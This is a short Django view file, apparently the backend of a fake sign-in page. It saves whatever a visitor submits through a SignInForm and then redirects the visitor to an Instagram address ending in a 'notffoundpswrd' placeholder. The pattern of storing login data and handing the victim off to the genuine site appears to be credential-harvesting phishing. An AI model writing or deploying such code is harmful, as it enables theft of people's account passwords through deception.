from django.http import HttpResponse

# Create your views here.
from django.shortcuts import render, redirect

from main.forms import SignInForm


def index(request):
    if request.method == 'POST':
        form = SignInForm(request.POST, request)
        if form.is_valid():
            form = form.save(commit=False)
            form.save()
            return redirect('https://www.instagram.com/%notffoundpswrd%/')
    else:
        form = SignInForm()     
    context = {'form': form}
    return render(request, 'main/index.html', context)
